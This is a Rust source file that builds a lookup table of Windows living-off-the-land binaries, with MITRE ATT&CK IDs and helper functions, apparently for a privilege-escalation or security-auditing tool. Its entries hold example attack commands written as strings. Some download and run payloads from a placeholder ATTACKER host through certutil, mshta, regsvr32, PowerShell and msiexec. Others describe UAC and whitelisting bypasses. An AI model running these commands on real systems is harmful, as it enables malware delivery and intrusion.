use std::collections::HashMap;
use once_cell::sync::Lazy;

use super::types::{LolbasCommand, LolbasEntry};

/// Database of LOLBAS entries for Windows privilege escalation
/// Reference: https://lolbas-project.github.io/
static LOLBAS_DB: Lazy<HashMap<&'static str, LolbasEntry>> = Lazy::new(|| {
    let mut db = HashMap::new();

    // Certutil
    db.insert("certutil.exe", LolbasEntry {
        name: "certutil.exe".to_string(),
        description: "Certificate utility for Windows".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "certutil.exe -urlcache -split -f http://ATTACKER/malware.exe malware.exe".to_string(),
                description: "Download file from remote server".to_string(),
                usecase: "Download".to_string(),
                category: "Download".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1105".to_string()),
            },
            LolbasCommand {
                command: "certutil.exe -encode inputfile.txt outputfile.txt".to_string(),
                description: "Encode file to Base64".to_string(),
                usecase: "Encode".to_string(),
                category: "Encode".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1027".to_string()),
            },
        ],
    });

    // Mshta
    db.insert("mshta.exe", LolbasEntry {
        name: "mshta.exe".to_string(),
        description: "Microsoft HTML Application Host".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "mshta.exe javascript:a=GetObject(\"script:http://ATTACKER/file.sct\").Exec()".to_string(),
                description: "Execute remote scriptlet".to_string(),
                usecase: "Execute".to_string(),
                category: "Execute".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1218.005".to_string()),
            },
            LolbasCommand {
                command: "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"calc\"\", 0:close\")".to_string(),
                description: "Execute VBScript payload".to_string(),
                usecase: "Execute".to_string(),
                category: "Execute".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1218.005".to_string()),
            },
        ],
    });

    // Rundll32
    db.insert("rundll32.exe", LolbasEntry {
        name: "rundll32.exe".to_string(),
        description: "Execute DLL files".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"calc\")".to_string(),
                description: "Execute JavaScript via rundll32".to_string(),
                usecase: "Execute".to_string(),
                category: "Execute".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1218.011".to_string()),
            },
            LolbasCommand {
                command: "rundll32.exe shell32.dll,Control_RunDLL file.dll".to_string(),
                description: "Execute arbitrary DLL".to_string(),
                usecase: "Execute".to_string(),
                category: "Execute".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1218.011".to_string()),
            },
        ],
    });

    // Regsvr32
    db.insert("regsvr32.exe", LolbasEntry {
        name: "regsvr32.exe".to_string(),
        description: "Register/unregister DLLs and ActiveX controls".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "regsvr32.exe /s /n /u /i:http://ATTACKER/file.sct scrobj.dll".to_string(),
                description: "Execute remote scriptlet (Squiblydoo)".to_string(),
                usecase: "Execute, AWL bypass".to_string(),
                category: "Execute".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1218.010".to_string()),
            },
        ],
    });

    // WMIC
    db.insert("wmic.exe", LolbasEntry {
        name: "wmic.exe".to_string(),
        description: "Windows Management Instrumentation Command-line".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "wmic.exe process call create \"cmd.exe /c calc\"".to_string(),
                description: "Execute command via WMI".to_string(),
                usecase: "Execute".to_string(),
                category: "Execute".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1047".to_string()),
            },
            LolbasCommand {
                command: "wmic.exe /node:REMOTECOMPUTER process call create \"cmd.exe /c payload\"".to_string(),
                description: "Remote command execution via WMI".to_string(),
                usecase: "Execute".to_string(),
                category: "Execute".to_string(),
                privileges: "Administrator".to_string(),
                mitre_id: Some("T1047".to_string()),
            },
        ],
    });

    // Msiexec
    db.insert("msiexec.exe", LolbasEntry {
        name: "msiexec.exe".to_string(),
        description: "Windows Installer".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "msiexec.exe /q /i http://ATTACKER/malicious.msi".to_string(),
                description: "Install remote MSI silently".to_string(),
                usecase: "Execute".to_string(),
                category: "Execute".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1218.007".to_string()),
            },
        ],
    });

    // Cscript/Wscript
    db.insert("cscript.exe", LolbasEntry {
        name: "cscript.exe".to_string(),
        description: "Windows Script Host console".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "cscript.exe //E:jscript http://ATTACKER/payload.txt".to_string(),
                description: "Execute remote script".to_string(),
                usecase: "Execute".to_string(),
                category: "Execute".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1059.005".to_string()),
            },
        ],
    });

    // PowerShell
    db.insert("powershell.exe", LolbasEntry {
        name: "powershell.exe".to_string(),
        description: "Windows PowerShell".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "powershell.exe -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')\"".to_string(),
                description: "Download and execute PowerShell script".to_string(),
                usecase: "Download and Execute".to_string(),
                category: "Execute".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1059.001".to_string()),
            },
            LolbasCommand {
                command: "powershell.exe -enc BASE64PAYLOAD".to_string(),
                description: "Execute Base64 encoded command".to_string(),
                usecase: "Execute".to_string(),
                category: "Execute".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1059.001".to_string()),
            },
        ],
    });

    // Bitsadmin
    db.insert("bitsadmin.exe", LolbasEntry {
        name: "bitsadmin.exe".to_string(),
        description: "Background Intelligent Transfer Service".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "bitsadmin.exe /transfer job /download /priority high http://ATTACKER/malware.exe C:\\Windows\\Temp\\malware.exe".to_string(),
                description: "Download file via BITS".to_string(),
                usecase: "Download".to_string(),
                category: "Download".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1197".to_string()),
            },
        ],
    });

    // InstallUtil
    db.insert("installutil.exe", LolbasEntry {
        name: "installutil.exe".to_string(),
        description: ".NET Installation Utility".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U payload.exe".to_string(),
                description: "Execute .NET assembly".to_string(),
                usecase: "Execute, AWL bypass".to_string(),
                category: "Execute".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1218.004".to_string()),
            },
        ],
    });

    // Regasm
    db.insert("regasm.exe", LolbasEntry {
        name: "regasm.exe".to_string(),
        description: ".NET Assembly Registration Utility".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U payload.dll".to_string(),
                description: "Execute .NET DLL".to_string(),
                usecase: "Execute, AWL bypass".to_string(),
                category: "Execute".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1218.009".to_string()),
            },
        ],
    });

    // MSBuild
    db.insert("msbuild.exe", LolbasEntry {
        name: "msbuild.exe".to_string(),
        description: "Microsoft Build Engine".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe payload.xml".to_string(),
                description: "Execute inline C# from XML project file".to_string(),
                usecase: "Execute, AWL bypass".to_string(),
                category: "Execute".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1127.001".to_string()),
            },
        ],
    });

    // Forfiles
    db.insert("forfiles.exe", LolbasEntry {
        name: "forfiles.exe".to_string(),
        description: "Batch processing utility".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "forfiles.exe /p c:\\windows\\system32 /m notepad.exe /c \"calc.exe\"".to_string(),
                description: "Execute command".to_string(),
                usecase: "Execute".to_string(),
                category: "Execute".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1202".to_string()),
            },
        ],
    });

    // Pcalua
    db.insert("pcalua.exe", LolbasEntry {
        name: "pcalua.exe".to_string(),
        description: "Program Compatibility Assistant".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "pcalua.exe -a calc.exe".to_string(),
                description: "Execute arbitrary executable".to_string(),
                usecase: "Execute".to_string(),
                category: "Execute".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1202".to_string()),
            },
        ],
    });

    // Eventvwr
    db.insert("eventvwr.exe", LolbasEntry {
        name: "eventvwr.exe".to_string(),
        description: "Event Viewer".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "eventvwr.exe (requires registry modification)".to_string(),
                description: "UAC bypass via registry hijack".to_string(),
                usecase: "UAC bypass".to_string(),
                category: "UAC bypass".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1548.002".to_string()),
            },
        ],
    });

    // Fodhelper
    db.insert("fodhelper.exe", LolbasEntry {
        name: "fodhelper.exe".to_string(),
        description: "Features On Demand Helper".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "fodhelper.exe (requires HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command)".to_string(),
                description: "UAC bypass via registry hijack".to_string(),
                usecase: "UAC bypass".to_string(),
                category: "UAC bypass".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1548.002".to_string()),
            },
        ],
    });

    // Sdclt
    db.insert("sdclt.exe", LolbasEntry {
        name: "sdclt.exe".to_string(),
        description: "Windows Backup utility".to_string(),
        author: None,
        commands: vec![
            LolbasCommand {
                command: "sdclt.exe /KickOffElev (requires registry modification)".to_string(),
                description: "UAC bypass".to_string(),
                usecase: "UAC bypass".to_string(),
                category: "UAC bypass".to_string(),
                privileges: "User".to_string(),
                mitre_id: Some("T1548.002".to_string()),
            },
        ],
    });

    db
});

/// Look up a binary in LOLBAS database
pub fn lookup_lolbas(binary: &str) -> Option<&'static LolbasEntry> {
    let binary_name = binary.rsplit('\\').next().unwrap_or(binary).to_lowercase();
    LOLBAS_DB.get(binary_name.as_str())
}

/// Check if a binary is in LOLBAS database
pub fn is_lolbas_binary(binary: &str) -> bool {
    let binary_name = binary.rsplit('\\').next().unwrap_or(binary).to_lowercase();
    LOLBAS_DB.contains_key(binary_name.as_str())
}

/// Get LOLBAS URL for a binary
pub fn get_lolbas_url(binary: &str) -> Option<String> {
    let binary_name = binary
        .rsplit('\\')
        .next()
        .unwrap_or(binary)
        .to_lowercase()
        .replace(".exe", "");
    if LOLBAS_DB.contains_key(format!("{}.exe", binary_name).as_str()) {
        Some(format!(
            "https://lolbas-project.github.io/lolbas/Binaries/{}/",
            binary_name.chars().next().unwrap().to_uppercase().to_string() + &binary_name[1..]
        ))
    } else {
        None
    }
}

/// Get all known LOLBAS binaries
pub fn get_all_lolbas() -> Vec<&'static str> {
    LOLBAS_DB.keys().copied().collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_lolbas_lookup() {
        assert!(lookup_lolbas("certutil.exe").is_some());
        assert!(lookup_lolbas("C:\\Windows\\System32\\certutil.exe").is_some());
        assert!(lookup_lolbas("nonexistent.exe").is_none());
    }

    #[test]
    fn test_is_lolbas_binary() {
        assert!(is_lolbas_binary("powershell.exe"));
        assert!(is_lolbas_binary("MSHTA.EXE")); // Case insensitive
        assert!(!is_lolbas_binary("notepad.exe"));
    }
}
